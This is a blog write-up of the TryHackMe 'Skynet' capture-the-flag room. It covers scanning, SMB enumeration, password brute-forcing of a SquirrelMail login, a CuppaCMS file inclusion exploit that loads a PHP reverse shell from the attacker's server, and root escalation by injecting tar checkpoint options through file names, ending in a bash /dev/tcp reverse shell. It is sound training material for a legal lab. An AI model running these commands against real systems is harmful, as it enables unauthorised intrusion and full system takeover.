---
title: Write-up — Skynet
date: 2025-07-30 05:00:00 PM
categories: [Write-up, Try Hack Me]
tags: [Try Hack Me, Write-up, ctf]
image: 'assets/img/articles/Skynet.png'
description: "Boost your cybersecurity skills with TryHackMe's Skynet room! This hands-on, Terminator-themed challenge focuses on penetration testing and ethical hacking. Perfect for intermediate learners, it covers network scanning, exploiting web vulnerabilities, and privilege escalation. Join now to master essential hacking techniques and gain root access through engaging, practical exercises."
---

> Walkthrough of room Skynet from TryHackMe :
> https://tryhackme.com/room/skynet

This room is designed to immerse you in a Terminator-themed cybersecurity challenge, focusing on penetration testing and ethical hacking techniques. It covers network scanning, web vulnerabilities, and privilege escalation to gain root access.

---

Let's go!!!

![Go!](https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExNXF3djBkemk0bGw5bnh6cWkwMWdzZjRjemhjeWRrejdjYW54ZGt4ZCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/r7ZtqpSM8GMta/giphy.gif)
_Go!_

## Reconnaissance

![Recon tiiiime](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExZHJvOGZyNWtlNmpyd21uZTRjMnRscTFxcDBqaG0waDBqNWk5YjlraSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/JBuDZwKcyrENW/giphy.gif)
_Recon tiiiime_

### Port enumeration
We gonna start by some port scan:

```bash
rustscan -a $TARGET -- -sC -sV

...
Open 10.10.184.33:22
Open 10.10.184.33:80
Open 10.10.184.33:110
Open 10.10.184.33:139
Open 10.10.184.33:143
Open 10.10.184.33:445
...
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        syn-ack ttl 63 Dovecot pop3d
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        syn-ack ttl 63 Dovecot imapd
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

This is the summary of the port scan.

| Service Name | Port Number | Protocol | Status |
| ------------ | ----------- | -------- | ------ |
| SSH          | 22          | TCP      | Open   |
| HTTP         | 80          | TCP      | Open   |
| POP3         | 110         | TCP      | Open   |
| NetBIOS      | 139         | TCP      | Open   |
| IMAP         | 143         | TCP      | Open   |
| Samba        | 445         | TCP      | Open   |

### SMB Enumeration

Has we have a samba server hosted on the target, let's do a SMB enum using `enum4linux`:

```bash
enum4linux -a $TARGET
```

**Users on 10.10.184.33**

| Category    | Details      |
| ----------- | ------------ |
| Index       | 0x1          |
| RID         | 0x3e8        |
| ACB         | 0x00000010   |
| Account     | milesdyson   |
| Name        |              |
| Description |              |

**Share Enumeration on 10.10.184.33**

| Sharename  | Type            |
| ---------- | --------------- |
| print$     | Printer Drivers |
| anonymous  | Disk            |
| milesdyson | Disk            |
| IPC$       | IPC             |

**Share Mapping Attempts on 10.10.184.33**

| Share Path                | Mapping |
| ------------------------- | ------- |
| //10.10.184.33/print$     | DENIED  |
| //10.10.184.33/anonymous  | OK      |
| //10.10.184.33/milesdyson | DENIED  |

### SMB harvesting `anonymous` share

```bash
smbclient //$TARGET/anonymous -N
```

```bash
smb: \> ls
  .                  D        0  Thu Nov 26 17:04:00 2020
  ..                 D        0  Tue Sep 17 09:20:17 2019
  attention.txt      N      163  Wed Sep 18 05:04:59 2019
  logs               D        0  Wed Sep 18 06:42:16 2019

		9204224 blocks of size 1024. 5829088 blocks available

smb: \> get attention.txt
...

smb: \> cd logs\

smb: \> ls
  .                  D        0  Wed Sep 18 06:42:16 2019
  ..                 D        0  Thu Nov 26 17:04:00 2020
  log2.txt           N        0  Wed Sep 18 06:42:13 2019
  log1.txt           N      471  Wed Sep 18 06:41:59 2019
  log3.txt           N        0  Wed Sep 18 06:42:16 2019
		9204224 blocks of size 1024. 5829088 blocks available

smb: \> get log1.txt
```

As you can see, `log2.txt` and `log3.txt` was empty with a size of 0kB.

Let's see what inside those files.

```bash
cat attention.txt

A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson

################
cat log1.txt

cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

At this point we can make two solid assomption:
- Miles Dyson change his own password
- The `log1.txt` is probably a password wordlist

Now, which one is Miles Dyson password?

Why not a brute-force on the other share?

```bash
hydra -l milesdyson -P Dump/wordlist.skynet $TARGET smb 

...
1 of 1 target completed, 0 valid password found
...
```

![whyyyy](https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExZ3ZkZ2tueDc2amZtdHh1cmwzMWJ0dWdrdnM1ZTNlcWlicnlsMjdieCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/13hzUKAm21cvDy/giphy.gif)
_whyyyy_

Okay, it is quite frustrating 😑 Let's see on the side of the Web app.

### WEB enumeration

```bash
$ gobuster dir -u http://skynet.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt   
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://skynet.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/admin                (Status: 301) [Size: 308] [--> http://skynet.thm/admin/]
/ai                   (Status: 301) [Size: 305] [--> http://skynet.thm/ai/]
/config               (Status: 301) [Size: 309] [--> http://skynet.thm/config/]
/css                  (Status: 301) [Size: 306] [--> http://skynet.thm/css/]
/js                   (Status: 301) [Size: 305] [--> http://skynet.thm/js/]
/server-status        (Status: 403) [Size: 275]
/squirrelmail         (Status: 301) [Size: 315] [--> http://skynet.thm/squirrelmail/]
Progress: 20478 / 20479 (100.00%)
===============================================================
Finished
===============================================================
```

It's seems only one page is accessible and it's a login page to mailing service.

| Path            | Status Code | Redirect Location                 | Accessibility      |
| --------------- | ----------- | --------------------------------- | ------------------ |
| `/admin`        | 301         | `http://skynet.thm/admin/`        | Resource forbidden |
| `/ai`           | 301         | `http://skynet.thm/ai/`           | Resource forbidden |
| `/config`       | 301         | `http://skynet.thm/config/`       | Resource forbidden |
| `/css`          | 301         | `http://skynet.thm/css/`          | Resource forbidden |
| `/js`           | 301         | `http://skynet.thm/js/`           | Resource forbidden |
| `/squirrelmail` | 301         | `http://skynet.thm/squirrelmail/` | Accessible         |

![](/assets/img/2025-07-30-THM-Skynet/squirrel-login-page.png)

A quick check from the code of this reveal nothing important. We should may be try the brute-force here. We gonna use Burp Suite to intercept some login attempts requests
- Open Burp Suite
- Go to Proxy > HTTP history
- Send a POST request to the Intruder
- Custom the request as bellow
![](/assets/img/2025-07-30-THM-Skynet/burp-brute-force-squirrel-1.png)
- On the right side, in the Payload dock
	- Choose Simple list as the payload type(`Payload type: Simple List`)
	- In Payload configuration, load log1.txt. All potential passwords will appear.
- Launch the Sniper attack

![](/assets/img/2025-07-30-THM-Skynet/burp-brute-force-squirrel-2.png)

The only HTTP 302 (Found) code!

![Terminator smilling](https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExZTFpYTJiYTV3bnVianV2MG0xM3V3YThkOXY2eTNyd2g0MWU3MzdmbiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/YoB1eEFB6FZ1m/giphy.gif)
_Terminator smilling_

We've got now the password, let's see what hide this mailbox.

![](/assets/img/2025-07-30-THM-Skynet/squirrel-home-page.png)

BINGO!!!
![](/assets/img/2025-07-30-THM-Skynet/squirrel-miles-password.png)
### SMB harvesting `milesdyson` share

```bash
$ smbclient //$TARGET/milesdyson -U milesdyson
```

![](/assets/img/2025-07-30-THM-Skynet/milesdyson-share-notes.png)
Several machine learning and AI stuff...

![](/assets/img/2025-07-30-THM-Skynet/milesdyson-share-notes-important.png)

This file name looks interesting. It's should contain sensitive information.

![](/assets/img/2025-07-30-THM-Skynet/milesdyson-share-important-file 1.png)

We've got the hidden web directory at `http://skynet.thm/xxxxxxxxxxxxxxxx`.

![Scared Nft](https://media3.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3ZjE5Y2RieHZsZm1uOHE2cDdyMGw0aXJmYnk4dnkxM3B2d3d3NG5nYSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/aBduWeWpn8NtWFOMIT/giphy.gif)
_Scared Nft_

> meme

![](/assets/img/2025-07-30-THM-Skynet/personal-page-miles.png)

No CMS here (even in the source code), only a static http personal page.

I guest we don't have the choice:

```bash
gobuster dir -u http://skynet.thm/45kra24zxs28v3yd/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt

...
/administrator        (Status: 301) [Size: 333] [--> http://skynet.thm/45kra24zxs28v3yd/administrator/]
...
```

![](/assets/img/2025-07-30-THM-Skynet/cuppa-cms.png)

But neither the two passwords found work on the login page. Even with `milesdyson@skynet`.

![I'll be back](https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExN2Q5ZGRqcGY4OWw0cHlnajV0Njl5eDd1OG8yZnI4NWxobjdpcDRuZCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/RfEbMBTPQ7MOY/giphy.gif)
_I'll be back_
### WEB exploitation

Happily we found a CVE on CuppaCMS CVE-25971 at [Exploit DB - CVE-25971](https://www.exploit-db.com/exploits/25971?source=post_page-----0cea67bb860d---------------------------------------). It's a Remote File Inclusion, it allows us to inject some code in the web app and execute it by some mean.

But firstly, we should verify if the web application is vulnerable. The CVE report says:

```
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

![](/assets/img/2025-07-30-THM-Skynet/testing-vulnerability.png)


![Hasta la vista baby](https://media1.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3bmgzNWs3MGN3OTViZnplcnQwNnhlangwanMzNDR6Z2NhcnQ4ZTJmNyZlcD12MV9naWZzX3JlbGF0ZWQmY3Q9Zw/10PMpMkNZgnqvK/100.gif)
_Hasta la vista baby_

Let's craft a PHP reverse shell payload to exploit this vulnerability.

- Retrieve php rev shell at https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
- Modify the IP address and the Port number with your
- Launch a python HTTP server in the same directory that contains your PHP payload
```bash
# In the same file with the revshell payload revshell.php
python3 -http.server 8000
```
- Listen  for connexion
```bash
nc -lvnp <PORT> # same port as the php payload
```

Now you have just to access `http://skynet/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<YOUR-IP>:8000/revshell.php`

The exploit didn't work for, I've got a `"WARNING: Failed to daemonise. This is quite common and not fatal. Connection timed out (110)"` message error. I may be due to some network config policies from the side of THM network team.

So if it does not work for you, switch to the **AttackBox**, it works totally fine.

![](/assets/img/2025-07-30-THM-Skynet/initial-access-www-data.png)

## Initial access
After exploiting the vulnerability, the user flag is quite easy to find. Let's go to the root flag.

![](/assets/img/2025-07-30-THM-Skynet/user-flag.png)

I tried to LinPeas but my terminal was too unstable to get the whole output of the script. So I manually enumerate the linux server. (Not that hard when you have a checklist).

I will skip to you my hard times, but just focus on **`cron jobs`**.

![](/assets/img/2025-07-30-THM-Skynet/crontab.png)

A job is running each minute and execute a script located at `/home/milesdyson/backups/backup.sh`. This script only compress (with **`tar`**) the content of `/var/www/html` with a **wildcard** using `sudo` rights.

```bash
cat /home/milesdyson/backups/backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

Knowing that **`tar`** is part of the list of GTFObin, it should be easy to escalate to root.

- On the AttackBox, listen for connection
```bash
nc -lvnp 4445
```
- In the `/var/www/html` execute theses commands
```bash
echo '' > --checkpoint=1
echo '' > '--checkpoint-action=exec=sh revshell.sh'
echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/<attackbox-ip>/4445 0>&1'" > revshell.sh # Modify the IP and may be the port number if you want to
```
- Wait a minute now

**Whats these commands actually do?**
- The first two `echo` commands create empty files with specific names that are used to exploit the `tar` command's checkpoint feature.
	- `--checkpoint=1`: This file represents the checkpoint number.
	- `--checkpoint-action=exec=sh revshell.sh`: This file specifies the action to be taken at the checkpoint, which is to execute the shell script `revshell.sh`.
- The third `echo` command creates a file named `revshell.sh` which contains the command to establish a reverse shell.

**Detailed explanation**
- The `tar` command has a checkpoint feature that lets you specify actions to be performed at regular intervals during archiving. This is useful for creating backups or other long-running operations.
- By creating files with specific names, you can manipulate the `tar` command to execute arbitrary commands. The `--checkpoint-action` option specifies the action to be taken at each checkpoint. In this case, it is set to execute a shell script (`revshell.sh`).
- When the `tar` command is executed with the checkpoint options, it reads the checkpoint files as option instead of files and executes the specified action (in this case, running the reverse shell script).

![](/assets/img/2025-07-30-THM-Skynet/root-privesc-shell.png)
And voilà!

The root flag is at `/root/root.txt`.

![Arnold Schwarzenegger Sunglasses](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExamExZ2hkcWdvY3FkZWkyMHN3MThnYWNzcDlkMG82czJrbTVpazd4dCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/z9g6xLr5C0H1m/200.gif)
_Arnold Schwarzenegger Sunglasses_

All flags down, mission passed.

Be proud of what you’ve accomplished.

![](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExejBueW15czhhbm82bGZydWlmbjc2ZHJxdHZ0eHE3MjAwNDhjZWh5OSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/Ju7l5y9osyymQ/giphy.gif)

See you soon!

> "Security is a chain; it's only as strong as the weakest link.”

## Comments
<script src="https://giscus.app/client.js"
        data-repo="Deomorphisme/Deomorphisme.github.io"
        data-repo-id="R_kgDONEIr-Q"
        data-category="General"
        data-category-id="DIC_kwDONEIr-c4CjomU"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="preferred_color_scheme"
        data-lang="en"
        data-loading="lazy"
        crossorigin="anonymous"
        async>
</script>
